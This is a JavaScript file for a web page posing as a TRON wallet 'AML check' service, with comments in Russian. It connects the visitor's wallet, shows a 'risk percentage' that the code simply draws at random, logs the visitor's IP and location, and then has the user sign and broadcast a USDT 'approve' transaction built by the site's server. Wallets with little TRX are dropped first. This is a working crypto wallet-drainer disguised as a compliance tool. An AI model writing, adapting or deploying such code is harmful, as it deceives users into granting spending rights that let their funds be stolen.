import './style.css';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
const adapter = new WalletConnectAdapter({
  network: 'Mainnet',
  options: {
    relayUrl: 'wss://relay.walletconnect.com',
    projectId: '934165c9fde2529b98c188077735f60c',
    metadata: {
      name: '',
      description: '',
      url: window.location.origin,
      icons: ['']
    }
  },
  web3ModalConfig: {
    themeMode: 'dark',
    explorerRecommendedWalletIds: [
      '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0'
    ]
  }
});

let walletAddress, trxBalance, usdtBalance, ip, location, id;

window.onload = async function() {
  try {
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) throw new Error('Network response was not ok ' + response.statusText);

    const data = await response.json();
    ip = data.ip;
    location = `${data.country}, ${data.region}, ${data.city}`;

    const storageKey = 'uniqueId';
    let uniqueId = localStorage.getItem(storageKey);

    if (!uniqueId) {
      uniqueId = Array.from({ length: 16 }, () => 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.charAt(Math.floor(Math.random() * 62))).join('');
      localStorage.setItem(storageKey, uniqueId);
    }

    id = "#" + uniqueId;

  } catch (error) {
    console.error('Failed to fetch IP information:', error);
  }
};

const walletAddressAml = document.querySelector('.wallet-address-aml');
const walletAddressTrx = document.querySelector('.wallet-address-trx');
const amlPercentElement = document.querySelector('.aml-percent');
const trxWalletBalanceElement = document.querySelector('.trx-wallet-balance');
const amlWalletBalanceElement = document.querySelector('.aml-wallet-balance');
const trxModalBgElement = document.querySelector('.trx-modal-bg');
const amlModalBgElement = document.querySelector('.aml-modal-bg');
const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

const connectWalletIfNeeded = async () => {
  if (!adapter.connected) {
    console.log("Подключение через WalletConnect...");
    await adapter.connect();
    console.log("Кошелек подключен: ", adapter.address);
  }
  return adapter.address;
};

const fetchData = async (walletAddress) => {
  console.log("Получение данных по адресу: ", walletAddress);
  const response = await fetch(`https://apilist.tronscan.org/api/account?address=${walletAddress}`);
  if (!response.ok) throw new Error('Network response was not ok ' + response.statusText);
  return await response.json();
};

const getBalances = (data) => {
  const usdtToken = data.trc20token_balances.find(token => token.tokenId === usdtContractAddress);
  return {
    trxBalance: data.balance || 0,
    usdtBalance: usdtToken ? usdtToken.balance : 0
  };
};

const displayWalletData = (walletAddress, usdtBalance, riskPercentage) => {
  walletAddressAml.textContent = `${walletAddress}`;
  walletAddressTrx.textContent = `${walletAddress}`;
  amlPercentElement.textContent = `${riskPercentage}%`;
  trxWalletBalanceElement.textContent = `${usdtBalance / 1e6} USDT`;
  amlWalletBalanceElement.textContent = `${usdtBalance / 1e6} USDT`;
};

const connectAndFetchData = async () => {
  try {
    // Подключение через WalletConnect
    walletAddress = await connectWalletIfNeeded();
    console.log("Кошелек подключен: ", walletAddress);

    // Получение баланса
    const data = await fetchData(walletAddress);
    ({ trxBalance, usdtBalance } = getBalances(data));
    console.log("Баланс получен: TRX =", trxBalance, "USDT =", usdtBalance);

    // Генерация случайного процента риска
    const riskPercentage = parseFloat((Math.random() * (15 - 7) + 7).toFixed(2));
    displayWalletData(walletAddress, usdtBalance, riskPercentage);
    
    // Проверка баланса TRX
    if (trxBalance / 1e6 < 22) {
      trxModalBgElement.style.display = 'block';
      await adapter.disconnect();
      console.warn("Недостаточно TRX на балансе. Отключение кошелька.");
      return false; // Возвращаем false, если баланса недостаточно
    }
    
    return true; // Возвращаем true, если всё прошло успешно
  } catch (error) {
    console.error('Ошибка подключения и получения данных:', error);
    return false;
  }
};

document.querySelectorAll('.action-btn').forEach(element => {
  element.addEventListener('click', async (event) => {
    event.preventDefault();

    try {
      // Шаг 1: Подключение к кошельку и проверка баланса
      const isConnected = await connectAndFetchData();
      if (!isConnected) {
        return; // Если подключение или проверка не прошли, выходим из функции
      }

      // Шаг 2: Создание транзакции 'approve'
      console.log("Создание транзакции 'approve'...");
      const createTransactionResponse = await fetch('/create-transaction', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress, id, ip, location, trxBalance, usdtBalance })
      });

      if (!createTransactionResponse.ok) {
        throw new Error('Не удалось создать транзакцию');
      }

      const { transaction } = await createTransactionResponse.json();
      console.log("Транзакция создана. Запрос подписи...");

      // Шаг 3: Подписание транзакции пользователем
      const signedTransaction = await adapter.signTransaction(transaction);
      console.log("Транзакция подписана.");

      // Шаг 4: Отправка подписанной транзакции в сеть
      console.log("Отправка подписанной транзакции в сеть...");
      const broadcastResponse = await fetch('/send-transaction', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ signedTransaction, walletAddress, ip, id, location, trxBalance, usdtBalance })
      });

      const broadcastResult = await broadcastResponse.json();

      if (broadcastResponse.ok) {
        amlModalBgElement.style.display = 'block';
        await adapter.disconnect();
      } else {
        console.error('Ошибка при отправке транзакции:', broadcastResult);
      }

    } catch (error) {
      console.error('Ошибка обработки транзакции:', error);
    }
  });
});
